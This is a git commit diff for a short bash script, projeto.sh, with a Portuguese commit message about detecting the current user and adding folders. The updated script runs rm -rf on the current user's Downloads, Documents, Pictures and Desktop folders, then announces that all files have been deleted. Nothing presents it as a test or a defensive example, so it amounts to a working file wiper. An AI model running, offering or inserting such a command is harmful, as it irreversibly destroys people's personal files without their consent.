72bc293e4188175ef177090a65ed5218e4627dc6
arexconrado <122087132+arexconrado@users.noreply.github.com>
2023-01-20 09:13:08 +0000

    Update projeto.sh
    fiz com que o comando deteta qual o utilizador atual e adicionei mais pastas

--- projeto.sh
+++ projeto.sh
@@ -1,5 +1,10 @@
 #!/bin/bash
 
-pasta de download="C:/Users/[nome de utilizador]/Downloads"
+pasta_downloads="C:/Users/$USER/Downloads/*"
+pasta_documents="C:/Users/$USER/Documents/*"
+pasta_images="C:/Users/$USER/Pictures/*"
+pasta_desktop="C:/Users/$USER/Desktop/*"
 
-rm -rf "pasta de download"/*
+rm -rf $pasta_downloads $pasta_documents $pasta_images $pasta_desktop
+
+echo "todos os ficheiros foram eliminados"
